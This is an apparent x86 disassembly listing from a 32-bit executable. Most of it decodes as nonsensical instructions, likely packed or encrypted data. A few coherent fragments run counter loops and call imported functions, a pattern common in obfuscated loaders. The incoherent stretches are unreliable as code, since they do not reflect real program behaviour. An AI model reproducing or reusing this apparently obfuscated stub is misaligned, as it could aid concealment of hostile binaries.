  404044:	lds    esp,FWORD PTR [edi+0x5637a565]
  40404a:	cdq    
  40404b:	clc    
  40404c:	pop    esi
  40404d:	imul   edi,DWORD PTR [esp+eiz*4],0x86dc0dea
  404054:	fimul  WORD PTR [esi]
  404056:	mov    al,ds:0x5995478c
  40405b:	in     eax,0xde
  40405d:	lock stos DWORD PTR es:[edi],eax
  40405f:	in     eax,dx
  404060:	xchg   ebp,eax
  404061:	fldcw  WORD PTR [eax]
  404063:	loop   0x4040a5
  404065:	jl     0x404009
  404067:	ret    0xa674
  40406a:	out    dx,eax
  40406b:	jge    0x40402a
  40406d:	in     al,0xa4
  40406f:	dec    ebx
  404070:	and    DWORD PTR [ebp-0x72],esp
  404073:	sbb    DWORD PTR cs:[edi-0x1c604b39],esp
  40407a:	das    
  40407b:	jbe    0x404014
  40407d:	sbb    ah,BYTE PTR [ecx-0x34]
  404080:	xchg   BYTE PTR [esi-0x6471df1a],ah
  404086:	xor    eax,0x61ae9ad4
  40408b:	frstpm(287 only) 
  40408d:	inc    DWORD PTR [esi+ebp*4-0x6b]
  404091:	icebp  
  404092:	mov    dh,0x53
  404094:	mov    edx,DWORD PTR [edx+0x45]
  404097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404098:	push   ebp
  404099:	mov    bl,0xdc
  40409b:	push   es
  40409c:	lea    esi,ss:[ebp+0x6ef23992]
  4040a3:	ss stc 
  4040a5:	clc    
  4040a6:	pop    ss
  4040a7:	add    dh,BYTE PTR [esi+eiz*4]
  4040aa:	shr    DWORD PTR [edi+0x328764ea],cl
  4040b0:	arpl   WORD PTR [edi+0x49],cx
  4040b3:	mov    BYTE PTR [esi-0x47],ch
  4040b6:	arpl   WORD PTR [ebx+0x3b288e63],dx
  4040bc:	rol    BYTE PTR [ecx-0x2710b8b],0x5
  4040c3:	add    cl,ch
  4040c5:	mov    bh,0x2
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xc1f7e6c1
  4040e3:	pop    ebx
  4040e4:	mov    ecx,0x78269e31
  4040e9:	js     0x4040e9
  4040eb:	jle    0x404165
  4040ed:	js     0x40410d
  4040ef:	outs   dx,DWORD PTR ds:[esi]
  4040f0:	inc    eax
  4040f1:	xchg   ebp,eax
  4040f2:	imul   edx,DWORD PTR [eax+edx*4+0x15],0x34e6d4ef
  4040fa:	mov    dl,0x6
  4040fc:	popa   
  4040fd:	fcom   DWORD PTR [edi-0x40e06949]
  404103:	mov    ebp,DWORD PTR [ebx]
  404105:	add    al,0x7f
  404107:	loop   0x404091
  404109:	clc    
  40410a:	ret    0xe66d
  40410d:	test   al,0xe
  40410f:	adc    ebx,DWORD PTR [eax+0x1a]
  404112:	push   ebp
  404113:	pop    es
  404114:	out    dx,al
  404115:	jo     0x4040bc
  404117:	call   0xc7d2:0x6adc6a86
  40411e:	dec    eax
  40411f:	inc    edx
  404120:	mov    ch,0x1b
  404122:	test   eax,0x5656b6ce
  404127:	mov    dl,0x9f
  404129:	(bad)  
  40412a:	(bad)  
  40412b:	cli    
  40412c:	jb     0x4040b4
  40412e:	dec    esi
  40412f:	xor    bl,BYTE PTR [edx]
  404131:	add    al,0xb6
  404133:	mov    bh,0x6f
  404135:	mov    edi,0x95fa43b4
  40413a:	or     dl,cl
  40413c:	push   edx
  40413d:	jmp    0x40418a
  40413f:	push   edi
  404140:	mov    bl,0xfa
  404142:	pop    edi
  404143:	add    dl,dl
  404145:	jp     0x40414e
  404147:	and    ch,BYTE PTR [ebx+0x71e7d117]
  40414d:	jo     0x404169
  40414f:	mov    ah,0x23
  404151:	adc    bh,BYTE PTR [ebx]
  404153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404154:	dec    ecx
  404155:	daa    
  404156:	push   edi
  404157:	pushf  
  404158:	out    dx,al
  404159:	or     DWORD PTR [edx],eax
  40415b:	mov    BYTE PTR [ebp-0x6f0e53a],cl
  404161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404162:	xchg   ebp,eax
  404163:	jne    0x404112
  404165:	test   DWORD PTR [edi],ebx
  404167:	gs push eax
  404169:	push   edi
  40416a:	jmp    0x8027:0x61f31634
  404171:	dec    DWORD PTR [ecx]
  404173:	add    dh,dl
  404175:	mov    al,ds:0xf694a8f1
  40417a:	sbb    al,0xc4
  40417c:	iret   
  40417d:	das    
  40417e:	daa    
  40417f:	test   eax,0xe3c5a16
  404184:	mov    edx,0xac294952
  40418a:	add    DWORD PTR ds:0xe61e669,0xd3d277c0
  404194:	pop    esp
  404195:	dec    esp
  404196:	bound  edx,QWORD PTR [edx-0x70]
  404199:	fld    QWORD PTR [esi]
  40419b:	jp     0x4041b3
  40419d:	push   esi
  40419e:	and    BYTE PTR [eax+0x3],ah
  4041a1:	sti    
  4041a2:	or     al,0xa0
  4041a4:	ret    0xadf9
  4041a7:	cmc    
  4041a8:	fwait
  4041a9:	sub    DWORD PTR [ecx+eax*8],ebp
  4041ac:	mov    edx,0xa3c379c9
  4041b2:	test   eax,0x92c73b6d
  4041b7:	xchg   edi,eax
  4041b8:	out    0x64,eax
  4041ba:	and    DWORD PTR [ebp-0x72],esi
  4041bd:	sbb    BYTE PTR ds:0x50960788,al
  4041c3:	dec    ebx
  4041c4:	sub    eax,0xbd7f35f0
  4041c9:	jp     0x404191
  4041cb:	jp     0x40424a
  4041cd:	xor    ebx,edx
  4041cf:	repz in eax,0x85
  4041d2:	cdq    
  4041d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d4:	add    eax,0x8e516369
  4041d9:	mov    edx,0x5038731a
  4041de:	outs   dx,DWORD PTR ds:[esi]
  4041df:	mov    ebp,0xcb2fa317
  4041e4:	bound  ebx,QWORD PTR [ebx]
  4041e6:	or     BYTE PTR [eax],dh
  4041e8:	mov    bl,0xa5
  4041ea:	sub    cl,BYTE PTR [edi+0x5ef5d761]
  4041f0:	mov    bl,0x24
  4041f2:	sti    
  4041f3:	xchg   ebx,eax
  4041f4:	retf   0xc97
  4041f7:	outs   dx,DWORD PTR ds:[esi]
  4041f8:	mov    esp,0x8cc2b7dc
  4041fd:	cmp    BYTE PTR [edx-0x38540024],ah
  404203:	jo     0x404254
  404205:	push   ebx
  404206:	sub    bh,BYTE PTR [edi+edi*4+0x4ea4d8a1]
  40420d:	dec    ebp
  40420e:	mov    dh,0xab
  404210:	imul   ecx,DWORD PTR [ecx+0x56],0x99d252e2
  404217:	mov    ds:0x244f7f08,eax
  40421c:	push   esi
  40421d:	nop
  40421e:	sub    ch,BYTE PTR [edi+0xdebc557]
  404224:	shr    DWORD PTR [edx],0xf2
  404227:	mov    cl,bl
  404229:	and    cl,bh
  40422b:	pop    edx
  40422c:	out    dx,al
  40422d:	jp     0x4041bd
  40422f:	shl    BYTE PTR [edi],cl
  404231:	outs   dx,BYTE PTR ds:[esi]
  404232:	lds    esp,FWORD PTR [ebx]
  404234:	cli    
  404235:	push   ebx
  404236:	rcr    DWORD PTR [esi+0x57],0x65
  40423a:	cmp    ah,ch
  40423c:	mov    ah,BYTE PTR [edx]
  40423e:	pop    ss
  40423f:	mov    cl,0xae
  404241:	mov    esp,0xa1262f33
  404246:	lahf   
  404247:	push   edx
  404248:	add    al,0x3
  40424a:	nop
  40424b:	in     eax,dx
  40424c:	sbb    DWORD PTR [ecx],esp
  40424e:	ss mov bh,0x62
  404251:	sbb    BYTE PTR [ebx+0x7b66c3fc],bl
  404257:	sub    BYTE PTR [esi+0x75],bh
  40425a:	retf   
  40425b:	mov    ebp,0x2efb9c3b
  404260:	cld    
  404261:	int    0x6c
  404263:	loopne 0x4042c5
  404265:	imul   eax,DWORD PTR [ebx-0x50],0x68
  404269:	and    ah,BYTE PTR [ecx+0x6b]
  40426c:	mov    ds,WORD PTR [esi+ecx*4-0x73836e7a]
  404273:	add    dl,BYTE PTR [esi-0x3f]
  404276:	mov    bh,0x5b
  404278:	or     ch,dl
  40427a:	leave  
  40427b:	jmp    0xb489:0x31627e26
  404282:	add    BYTE PTR [ecx-0x4d0148f6],bh
  404288:	xor    BYTE PTR [edi],dh
  40428a:	out    0x5b,eax
  40428c:	rol    DWORD PTR [ecx-0x2f3be5da],cl
  404292:	push   ebx
  404293:	(bad)  
  404295:	aaa    
  404296:	sbb    eax,0x850d6658
  40429b:	outs   dx,BYTE PTR ds:[esi]
  40429c:	int    0xbd
  40429e:	gs adc eax,0xb263a39e
  4042a4:	dec    BYTE PTR [eax-0x66]
  4042a7:	xchg   esp,eax
  4042a8:	push   ss
  4042a9:	mov    db3,ebx
  4042ac:	push   DWORD PTR [edi-0x607d3992]
  4042b2:	aas    
  4042b3:	xor    eax,0x73cee1fc
  4042b8:	jae    0x404305
  4042ba:	test   DWORD PTR [ebx+0x45477147],edx
  4042c0:	cmp    eax,0x26bdb778
  4042c5:	mov    cl,0x47
  4042c7:	fcomp  DWORD PTR ds:0xbeac10eb
  4042cd:	loopne 0x4042e3
  4042cf:	adc    eax,0xcf6738f6
  4042d4:	addr16 mov ds:0x53e5,eax
  4042d8:	pop    ds
  4042d9:	pop    eax
  4042da:	int    0xbf
  4042dc:	mov    esp,0x8442971b
  4042e1:	aas    
  4042e2:	je     0x40429f
  4042e4:	in     al,dx
  4042e5:	ret    
  4042e6:	ret    0x2eae
  4042e9:	adc    BYTE PTR [ebx],cl
  4042eb:	call   DWORD PTR [esi]
  4042ed:	adc    bh,BYTE PTR [esi+ebp*4+0x71]
  4042f1:	pop    ss
  4042f2:	lods   al,BYTE PTR ds:[esi]
  4042f3:	adc    edx,DWORD PTR [eax+ebp*1+0x77f7ff8]
  4042fa:	dec    edi
  4042fb:	or     DWORD PTR [edx-0x5497ff60],ebx
  404301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404302:	xchg   edi,esi
  404304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404305:	jl     0x404332
  404307:	daa    
  404308:	lds    esi,FWORD PTR ds:0xf1e9a506
  40430e:	adc    ch,BYTE PTR [esi]
  404310:	push   es
  404311:	mov    esp,0x1518d413
  404316:	pop    DWORD PTR [esi]
  404318:	sub    al,0xa4
  40431a:	mov    BYTE PTR [eax+0x4f0eb8e7],dl
  404320:	(bad)  [esi+0x78c1ce7b]
  404326:	popf   
  404327:	mov    bh,0xcc
  404329:	inc    edi
  40432a:	ds ins BYTE PTR es:[edi],dx
  40432c:	xchg   ebp,eax
  40432d:	cmp    edx,ebp
  40432f:	dec    esi
  404330:	adc    al,0x9c
  404332:	cmp    al,BYTE PTR [ebp+eiz*1-0x67]
  404336:	jg     0x4042bf
  404338:	jns    0x404312
  40433a:	pop    edi
  40433b:	or     dh,al
  40433d:	and    al,0xf4
  40433f:	jae    0x4043bd
  404341:	mov    ds,WORD PTR [esi-0x16]
  404344:	ret    
  404345:	cdq    
  404346:	inc    ebx
  404347:	or     bh,dl
  404349:	mov    dh,0x96
  40434b:	sti    
  40434c:	dec    esi
  40434d:	push   ebx
  40434e:	scas   al,BYTE PTR es:[edi]
  40434f:	shr    DWORD PTR [edx-0x3247b8ff],1
  404355:	pop    edi
  404356:	loopne 0x4043ad
  404358:	pushf  
  404359:	sub    dl,bl
  40435b:	mov    esi,0x5c488a63
  404360:	call   0xfb58:0x536ee938
  404367:	jb     0x404399
  404369:	xor    ebp,edi
  40436b:	or     BYTE PTR [edi],0xa1
  40436e:	or     dh,BYTE PTR [edi-0x77]
  404371:	or     BYTE PTR [ebx+0x458b0c45],cl
  404377:	or     bh,bh
  404379:	jne    0x404373
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	les    esp,FWORD PTR [edi]
  40441b:	sub    dh,BYTE PTR [edx+0x78782b1c]
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x404433
  404426:	addr16 pop es
  404428:	lock xchg BYTE PTR [esp+edi*4],ah
  40442c:	mov    esp,0x8b55b3bb
  404431:	in     eax,dx
  404432:	repnz cmp esp,esi
  404435:	bound  eax,QWORD PTR [ebx-0x75dea7b5]
  40443b:	and    DWORD PTR [edi],ebp
  40443d:	into   
  40443e:	push   0x24f444d7
  404443:	(bad)  
  404444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404445:	test   DWORD PTR [edx+0x41],ebp
  404448:	xlat   BYTE PTR ds:[ebx]
  404449:	bound  edi,QWORD PTR [ecx-0x55]
  40444c:	ret    0x1adf
  40444f:	aas    
  404450:	and    eax,0xc3471d13
  404455:	mov    eax,ds:0xf8ea3e89
  40445a:	test   DWORD PTR [edx-0x6899439c],edi
  404460:	sti    
  404461:	xor    eax,ebx
  404463:	stc    
  404464:	mov    dh,0xec
  404466:	pop    edi
  404467:	jle    0x404422
  404469:	enter  0xe2bd,0xe8
  40446d:	ret    0x4e2d
  404470:	aad    0x69
  404472:	push   esi
  404473:	inc    eax
  404474:	cdq    
  404475:	fisubr WORD PTR [ecx]
  404477:	pop    esp
  404478:	pop    ecx
  404479:	push   cs
  40447a:	mov    ebp,ss
  40447c:	leave  
  40447d:	div    BYTE PTR [edx-0x16]
  404480:	sbb    dh,BYTE PTR [eax]
  404482:	lea    ecx,[ebp+eiz*4+0x734784]
  404489:	shr    BYTE PTR [esi+0x27],1
  40448c:	scas   al,BYTE PTR es:[edi]
  40448d:	gs xchg ebp,eax
  40448f:	jmp    0xeaca:0xd9600315
  404496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404497:	iret   
  404498:	(bad)  
  404499:	ins    BYTE PTR es:[edi],dx
  40449a:	adc    esp,edx
  40449c:	out    0xe0,al
  40449e:	loopne 0x4044df
  4044a0:	iret   
  4044a1:	cwde   
  4044a2:	inc    ebp
  4044a3:	std    
  4044a4:	add    eax,0xa977896a
  4044a9:	rcr    BYTE PTR [eax+0x12],cl
  4044ac:	je     0x4044ef
  4044ae:	hlt    
  4044af:	cmp    al,0x8d
  4044b1:	sahf   
  4044b2:	xor    al,0x52
  4044b4:	aas    
  4044b5:	mov    eax,ds:0x6dcfabcd
  4044ba:	jmp    0xaa02:0x52a47c50
  4044c1:	ins    DWORD PTR es:[edi],dx
  4044c2:	xor    eax,0x49671713
  4044c7:	mov    al,0x83
  4044c9:	sub    bl,dh
  4044cb:	stc    
  4044cc:	adc    DWORD PTR [ecx],0x2c
  4044cf:	inc    esi
  4044d0:	add    BYTE PTR [ebp+0x53],cl
  4044d3:	xchg   ebx,eax
  4044d4:	adc    DWORD PTR [ebp+0x30c4c254],esi
  4044da:	inc    ebp
  4044db:	gs inc ecx
  4044dd:	or     DWORD PTR [ebx+0x53],edx
  4044e0:	dec    ebx
  4044e1:	call   0x319adc95
  4044e6:	mov    dl,0xe9
  4044e8:	pop    edi
  4044e9:	mov    al,0x74
  4044eb:	lahf   
  4044ec:	fisub  DWORD PTR [edi+0x3e]
  4044ef:	xor    ecx,DWORD PTR [esi+0x4ecb9b72]
  4044f5:	and    eax,esp
  4044f7:	cdq    
  4044f8:	clc    
  4044f9:	cmp    BYTE PTR [edx-0xa],al
  4044fc:	mov    ebp,0x26c2b9a9
  404501:	dec    eax
  404502:	jns    0x404539
  404504:	push   ebx
  404505:	push   ds
  404506:	inc    edi
  404508:	rcr    BYTE PTR [esi-0x46],1
  40450b:	test   BYTE PTR ds:0x24ec430e,al
  404511:	loope  0x4044fe
  404513:	outs   dx,DWORD PTR ds:[esi]
  404514:	pop    ss
  404515:	xchg   edx,eax
  404516:	jmp    0x9526:0x21e34ab9
  40451d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451e:	retf   0x4378
  404521:	mov    cs,WORD PTR [ebx-0x3b]
  404524:	sub    bh,BYTE PTR [edi+0x6fda4bba]
  40452a:	or     DWORD PTR [eax-0x5b],ecx
  40452d:	fbstp  TBYTE PTR [esi-0x2d]
  404530:	sbb    esp,DWORD PTR fs:[esi+edx*4-0x78820dde]
  404538:	xchg   edx,eax
  404539:	inc    edx
  40453a:	inc    ebp
  40453b:	or     al,BYTE PTR [ebx+esi*2+0x50]
  40453f:	sub    esi,DWORD PTR [ebp+ecx*1+0x1d44d248]
  404546:	push   cs
  404547:	icebp  
  404548:	fnstsw WORD PTR [edx]
  40454a:	pop    esi
  40454b:	in     eax,0x4b
  40454d:	push   edx
  40454e:	mov    dh,0x74
  404550:	in     eax,dx
  404551:	into   
  404552:	mov    bh,0xb3
  404554:	push   es
  404555:	repnz ror BYTE PTR [ebx+eax*4+0x60b3df54],cl
  40455d:	stc    
  40455e:	sbb    BYTE PTR [ecx-0x4d],dl
  404561:	daa    
  404562:	jne    0x404597
  404564:	mov    ds:0x82be9daf,eax
  404569:	data16 fstp QWORD PTR [edx+esi*8]
  40456d:	lock jo 0x404595
  404570:	cmpxchg BYTE PTR ds:0x6ebe6c5b,bh
  404577:	fmul   st,st(5)
  404579:	xchg   BYTE PTR [ebp+0x3b],al
  40457c:	add    BYTE PTR [edi-0x5800e96e],ch
  404582:	jmp    0x42a2:0x11edfbe0
  404589:	hlt    
  40458a:	mov    dl,0x8a
  40458c:	mov    dl,BYTE PTR [ecx]
  40458e:	mov    edx,0xb307454b
  404593:	sbb    esi,DWORD PTR [edx+0x67]
  404596:	xor    ah,BYTE PTR [ecx-0x78755e74]
  40459c:	in     eax,dx
  40459d:	sbb    esp,DWORD PTR [ebp+0x356b44c7]
  4045a3:	add    ch,BYTE PTR [edi]
  4045a5:	push   edi
  4045a6:	inc    ebp
  4045a7:	mov    cl,0x86
  4045a9:	xor    eax,0x89523361
  4045ae:	inc    esi
  4045af:	xor    BYTE PTR [ebp-0x10],ch
  4045b2:	and    al,0x94
  4045b4:	or     DWORD PTR ds:0xf46647ca,ebp
  4045ba:	push   edi
  4045bb:	xchg   edi,eax
  4045bc:	mov    esi,0xfe3dff03
  4045c1:	sub    BYTE PTR [edi],bl
  4045c3:	js     0x4045ab
  4045c5:	cmc    
  4045c6:	xor    cl,BYTE PTR cs:[edx]
  4045c9:	in     eax,dx
  4045ca:	jmp    0xba72b7e
  4045cf:	je     0x4045ae
  4045d1:	sbb    BYTE PTR [esi+esi*8],0xb7
  4045d5:	pop    ss
  4045d6:	stos   DWORD PTR es:[edi],eax
  4045d7:	and    DWORD PTR [ecx+0x40],ebp
  4045da:	dec    ebp
  4045db:	test   ch,ch
  4045dd:	inc    eax
  4045de:	or     DWORD PTR [eax],0xc40d995
  4045e4:	call   0x718a:0x9c8d48de
  4045eb:	in     al,dx
  4045ec:	adc    DWORD PTR [ebp-0x7d],ecx
  4045ef:	lods   al,BYTE PTR ds:[esi]
  4045f0:	inc    eax
  4045f1:	xor    ecx,ebp
  4045f3:	and    edi,DWORD PTR [ecx+0x2f]
  4045f6:	add    BYTE PTR [eax+0x5eb96c54],bl
  4045fc:	jmp    0x8cda01e3
  404601:	inc    DWORD PTR [ebp+0x40]
  404604:	or     al,0xe4
  404606:	mov    esp,0x5a3430ab
  40460b:	sbb    BYTE PTR [ecx+0x4],dl
  40460e:	cmp    esi,esi
  404610:	repnz mov esp,0xd84dd5f
  404616:	sub    DWORD PTR [eax],ecx
  404618:	mov    bl,0x53
  40461a:	cld    
  40461b:	or     BYTE PTR [ecx-0x645b4cfa],al
  404621:	pushf  
  404622:	aam    0xa8
  404624:	jge    0x404601
  404626:	(bad)  
  404627:	mov    esp,0x12d1a02f
  40462c:	inc    cx
  40462e:	or     BYTE PTR [ecx-0x4d],dl
  404631:	sub    ah,al
  404633:	push   ebx
  404634:	ins    BYTE PTR es:[edi],dx
  404635:	gs ja  0x404600
  404638:	lods   eax,DWORD PTR ds:[esi]
  404639:	mov    esi,0xb5635e9b
  40463e:	shl    DWORD PTR [ebp+0x5d4ae3dc],0xef
  404645:	jo     0x404620
  404647:	push   ecx
  404648:	jmp    0xd0234193
  40464d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40464e:	out    dx,eax
  40464f:	mov    ch,al
  404651:	sbb    BYTE PTR [ebx],al
  404653:	fisubr WORD PTR [eax]
  404655:	aam    0x84
  404657:	aad    0x5f
  404659:	push   ebx
  40465a:	adc    ch,dh
  40465c:	mov    WORD PTR [edi],ds
  40465e:	sbb    ch,ch
  404660:	and    eax,0xe6edd4b6
  404665:	pushf  
  404666:	push   eax
  404667:	mov    cl,0xb4
  404669:	push   es
  40466a:	shr    al,cl
  40466c:	das    
  40466d:	adc    BYTE PTR [ecx+0x52a328e2],ah
  404673:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  404675:	jge    0x404642
  404677:	sbb    al,0xbf
  404679:	aaa    
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	or     esp,DWORD PTR [edi+edi*1-0x1b]
  40467f:	ins    BYTE PTR es:[edi],dx
  404680:	xchg   BYTE PTR [esi],ah
  404682:	fstp   TBYTE PTR [edi]
  404684:	(bad)  
  404685:	xor    al,0xec
  404687:	push   cs
  404688:	daa    
  404689:	(bad)  
  40468a:	inc    ebx
  40468b:	mov    edi,0x24e8b729
  404690:	add    ch,BYTE PTR [ecx]
  404692:	jnp    0x40464c
  404694:	idiv   DWORD PTR [eax-0x30]
  404697:	nop
  404698:	sub    eax,0x3f6d9f3e
  40469d:	sar    DWORD PTR [ecx+eiz*4+0x554cf671],1
  4046a4:	pop    ebx
  4046a5:	shr    al,0x15
  4046a8:	cmp    al,0xf4
  4046aa:	mov    ch,BYTE PTR [edi-0x2f]
  4046ad:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046af:	jo     0x40465d
  4046b1:	pop    ss
  4046b2:	pop    es
  4046b3:	add    ch,BYTE PTR [ebx-0x7cb8fd6d]
  4046b9:	mov    ebx,0xbf0d69b5
  4046be:	and    ebp,DWORD PTR [edx+0x5d]
  4046c1:	in     al,0x59
  4046c3:	icebp  
  4046c4:	cmp    DWORD PTR [ebx-0x6511ea15],ebp
  4046ca:	inc    eax
  4046cb:	inc    esi
  4046cc:	fcmovbe st,st(5)
  4046ce:	sbb    al,0x33
  4046d0:	jnp    0x404751
  4046d2:	mov    edx,0x27b7156d
  4046d7:	fadd   st,st(2)
  4046d9:	daa    
  4046da:	cmp    bh,BYTE PTR [ecx]
  4046dc:	scas   al,BYTE PTR es:[edi]
  4046dd:	xor    edi,ecx
  4046df:	call   DWORD PTR [ebx+ebp*2+0x7210282]
  4046e6:	push   eax
  4046e7:	or     DWORD PTR [esi],ebx
  4046e9:	not    DWORD PTR [ebx+eiz*2+0x279c416c]
  4046f0:	push   ecx
  4046f1:	push   ss
  4046f2:	fwait
  4046f3:	loope  0x4046c8
  4046f5:	push   ebp
  4046f6:	mov    ecx,0x25815680
  4046fb:	jne    0x4046a4
  4046fd:	inc    edx
  4046fe:	add    BYTE PTR [eax],al
  404700:	add    BYTE PTR [eax],al
  404702:	add    cl,ch
  404704:	or     eax,0x8b000000
  404709:	xor    eax,0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x439983de
  404770:	test   DWORD PTR [ecx],eax
  404772:	jno    0x40479d
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x404723
  40477b:	cmp    edi,DWORD PTR [esi]
  40477d:	fs pusha 
  40477f:	int    0x6b
  404781:	adc    edx,edi
  404783:	mov    edi,ecx
  404785:	and    ebp,DWORD PTR [esi]
  404787:	std    
  404788:	std    
  404789:	jge    0x404782
  40478b:	bnd jb 0x404737
  40478e:	xchg   BYTE PTR [edx],bh
  404790:	jmp    0x3745:0x8968a492
  404797:	les    ebx,FWORD PTR [ecx]
  404799:	rcr    edi,cl
  40479b:	push   0x77
  40479d:	fmul   QWORD PTR [esi+0x60]
  4047a0:	push   esp
  4047a1:	and    al,bh
  4047a3:	das    
  4047a4:	mov    al,ds:0xb953f27d
  4047a9:	push   ss
  4047aa:	into   
  4047ab:	inc    ebp
  4047ac:	sub    ecx,edi
  4047ae:	repnz sti 
  4047b0:	xchg   edi,eax
  4047b1:	mov    cs,edx
  4047b3:	xchg   edx,eax
  4047b4:	inc    esp
  4047b5:	jne    0x404804
  4047b7:	out    dx,al
  4047b8:	retf   0x1db3
  4047bb:	jbe    0x40475d
  4047bd:	out    dx,al
  4047be:	xlat   BYTE PTR ds:[ebx]
  4047bf:	je     0x404796
  4047c1:	mov    ah,0x5a
  4047c3:	xor    al,0x97
  4047c5:	or     esi,0x2a44e06f
  4047cb:	in     al,dx
  4047cc:	mov    DWORD PTR ds:[esi],0x7a0c9a13
  4047d3:	stc    
  4047d4:	lods   eax,DWORD PTR ds:[esi]
  4047d5:	(bad)  
  4047d7:	ss test al,0x31
  4047da:	xor    BYTE PTR [esi+esi*1-0x2201e405],dl
  4047e1:	mov    ?,WORD PTR [esi]
  4047e3:	fbld   TBYTE PTR [edx]
  4047e5:	mov    ds:0x43bca56f,eax
  4047ea:	arpl   si,sp
  4047ec:	dec    ecx
  4047ed:	outs   dx,BYTE PTR ds:[esi]
  4047ee:	push   edi
  4047ef:	cmc    
  4047f0:	loopne 0x4047d3
  4047f2:	xor    ebp,DWORD PTR [ebx+0x799907aa]
  4047f8:	les    edx,FWORD PTR [esi]
  4047fa:	in     eax,0x74
  4047fc:	dec    esi
  4047fd:	jb     0x404783
  4047ff:	mov    eax,ds:0xa0882663
  404804:	fadd   QWORD PTR [eax]
  404806:	cmp    al,0x2c
  404808:	jnp    0x404853
  40480a:	in     al,0xb
  40480c:	jbe    0x40478e
  40480e:	outs   dx,DWORD PTR ds:[esi]
  40480f:	fwait
  404810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404811:	mov    ds:0xc32f5a8b,al
  404816:	ficomp WORD PTR [edi-0x4b]
  404819:	pop    ebp
  40481a:	adc    eax,0x58026b3e
  40481f:	adc    al,ch
  404821:	add    al,0x75
  404823:	mov    cl,0xa7
  404825:	retf   0x755c
  404828:	adc    esp,DWORD PTR [ecx+eiz*8-0x4732c9b5]
  40482f:	mov    al,ds:0x5132e24d
  404834:	sbb    eax,0xb86e2fa
  404839:	cmp    al,0xc9
  40483b:	ins    DWORD PTR es:[edi],dx
  40483c:	imul   bl
  40483e:	imul   esp,DWORD PTR [eax+0x0],0xc3d63f8a
  404845:	mov    ebx,0xb989be2c
  40484a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40484b:	xor    ebx,0x715dc242
  404851:	js     0x4048b6
  404853:	xchg   esp,eax
  404854:	jb     0x404869
  404856:	pop    ebp
  404857:	adc    al,0x70
  404859:	cli    
  40485a:	out    0xb2,al
  40485c:	sbb    eax,0x7cb233b7
  404861:	pop    ebp
  404862:	adc    esi,DWORD PTR [edi-0x6da08fd]
  404868:	cmp    eax,0x7f6f9ca0
  40486d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40486e:	fld    QWORD PTR [ecx]
  404870:	out    0xa6,eax
  404872:	and    eax,0x70b4e104
  404877:	rol    DWORD PTR [edx-0x7408fe11],1
  40487d:	(bad)  
